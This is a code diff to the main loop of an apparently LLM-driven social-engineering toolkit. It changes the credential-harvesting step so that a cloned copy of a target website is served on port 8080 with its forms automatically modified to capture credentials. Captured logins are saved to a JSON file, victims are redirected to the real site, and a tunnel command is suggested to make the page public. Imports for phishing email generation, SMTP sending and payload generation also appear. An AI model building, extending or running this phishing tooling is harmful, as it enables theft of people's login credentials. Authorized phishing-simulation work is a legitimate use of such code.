@@ -12,6 +12,7 @@ from urllib.parse import urlparse
 from autoset.core.llm_provider import LLMProvider
 from autoset.core.prompts import SE_SYSTEM_PROMPT, EMAIL_GENERATION_PROMPT
 from autoset.tools.harvester import start_harvester
+from autoset.tools.integrated_harvester import start_integrated_harvester
 from autoset.tools.web_clone import clone_website, modify_forms
 from autoset.tools.smtp import send_email
 from autoset.tools.payload_gen import generate_payload, list_payloads
@@ -110,10 +111,10 @@ def main():
                 
                 url = parts[1]
                 print(f"\n🎣 Starting credential harvester for {url}...")
+                print(f"📥 Cloning website (this may take a moment)...")
                 
                 # Clone website
                 clone_dir = workspace / "cloned_site"
-                print(f"📥 Cloning website...")
                 result = clone_website(url, str(clone_dir))
                 
                 if result["success"]:
@@ -124,26 +125,24 @@ def main():
                     domain = parsed.netloc
                     site_dir = Path(result['path']) / domain
                     
-                    # Start harvester
-                    print(f"🚀 Starting credential harvester on port 8080...")
-                    harvester = start_harvester(
-                        port=8080,
-                        output_file=str(workspace / "harvested_creds.json"),
-                        redirect_url=url
-                    )
-                    
-                    print(f"✅ Harvester running on http://localhost:8080")
-                    print(f"📊 Captured credentials will be saved to: {workspace / 'harvested_creds.json'}")
-                    
-                    # Serve the cloned site
                     if site_dir.exists():
-                        print(f"\n📂 Serving cloned site from: {site_dir}")
-                        print(f"💡 To serve the cloned site, run in another terminal:")
-                        print(f"   cd {site_dir}")
-                        print(f"   python3 -m http.server 8081")
-                        print(f"   Then visit: http://localhost:8081")
-                    
-                    print(f"\n💡 Tip: Use /tunnel 8080 to make harvester publicly accessible")
+                        # Start integrated harvester (serves site + captures creds)
+                        print(f"🚀 Starting integrated harvester on port 8080...")
+                        harvester = start_integrated_harvester(
+                            site_dir=str(site_dir),
+                            port=8080,
+                            output_file=str(workspace / "harvested_creds.json"),
+                            redirect_url=url
+                        )
+                        
+                        print(f"✅ Harvester running on http://localhost:8080")
+                        print(f"✅ Cloned site being served with all assets")
+                        print(f"✅ Forms automatically modified to capture credentials")
+                        print(f"📊 Captured credentials: {workspace / 'harvested_creds.json'}")
+                        print(f"\n💡 Open http://localhost:8080 in your browser")
+                        print(f"💡 Use /tunnel 8080 to make it publicly accessible")
+                    else:
+                        print(f"⚠️  Site directory not found: {site_dir}")
                 else:
                     print(f"❌ Clone failed: {result.get('error')}")
             
